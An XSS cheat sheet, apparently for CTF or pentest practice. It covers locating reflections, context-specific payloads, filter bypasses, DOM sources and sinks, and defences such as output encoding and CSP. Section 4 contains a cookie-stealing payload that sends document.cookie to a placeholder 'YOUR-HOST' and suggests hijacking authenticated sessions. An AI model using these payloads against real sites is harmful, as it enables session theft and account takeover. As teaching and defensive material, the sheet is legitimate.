# Cross-site scripting (XSS)

XSS is when you get your own JavaScript to run in another user's browser, in the
context of the target site. From there you can read the page, steal session
material, act as the victim, or pivot. Three flavours: **reflected** (payload
echoed back in the response), **stored** (payload saved server-side and served
to others), and **DOM-based** (client-side JS writes your input into the page).

All examples are generic. Nothing here is the solution to a specific challenge.

## 1. Finding a reflection

Send a unique marker (`white7391`) in every parameter, header and path segment,
then search the response for it. Where it lands tells you the context and what
you need to break out of:

- **HTML body** — `<h1>white7391</h1>`
- **Attribute** — `<input value="white7391">`
- **JS string** — `var x = "white7391";`
- **URL** — `<a href="white7391">`

## 2. Context decides the payload

Match the break-out to where you landed:

**HTML body** — inject a tag directly:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Inside an attribute** — close it first:

```
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
```

**Inside a JS string** — close the string/statement:

```
";alert(1)//
</script><script>alert(1)</script>
```

**In an href** — switch the scheme:

```
javascript:alert(1)
```

## 3. Filter bypass

When naive filters strip `<script>` or `alert`:

- **Other tags/handlers** — `<img onerror>`, `<svg onload>`, `<body onload>`,
  `<details open ontoggle=alert(1)>`.
- **Case / nesting** — `<ScRiPt>`, `<scr<script>ipt>` (filter removes the inner,
  rejoins the outer).
- **No parentheses** — `onerror=alert\`1\`` (template literal), or
  `location=name`.
- **Encoding** — HTML entities in attributes (`&#x61;lert`), or
  `eval(atob('...'))` to hide the string.

## 4. Turning it into impact

A popup proves execution; show real impact with a payload that does something:

```html
<img src=x onerror="new Image().src='//YOUR-HOST/c?'+document.cookie">
```

If the cookie is `HttpOnly` you can't read it — pivot instead: make authenticated
requests with `fetch()` (same origin, cookies ride along), scrape CSRF tokens,
submit forms, or hook the browser.

## 5. DOM-based XSS

No server reflection needed. The vulnerable code is client-side: a **source**
you control flows into a dangerous **sink**.

Sources: `location`, `location.hash`, `document.referrer`, `postMessage`.
Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str)`,
`element.src`.

Search the JS for a sink reading from a source, e.g.:

```js
div.innerHTML = location.hash.slice(1);   // #<img src=x onerror=alert(1)>
```

The payload never touches the server — it lives in the URL fragment the browser
processes locally.

## 6. Defending

- **Context-aware output encoding** — HTML-encode on HTML output, JS-encode in
  scripts, URL-encode in URLs. A modern framework (React, Vue, Angular) does
  most of this automatically; don't fight it with `dangerouslySetInnerHTML` /
  `v-html`.
- **Content-Security-Policy** — a strict `script-src` (nonces/hashes, no
  `unsafe-inline`) turns many injections into dead HTML.
- **HttpOnly** cookies so script can't read the session; **SameSite** to blunt
  cross-site requests.
- For DOM sinks, use `textContent` not `innerHTML`, and sanitise with a trusted
  library (DOMPurify) when you truly need HTML.

---

Built by **White** · [github.com/white-exee](https://github.com/white-exee)
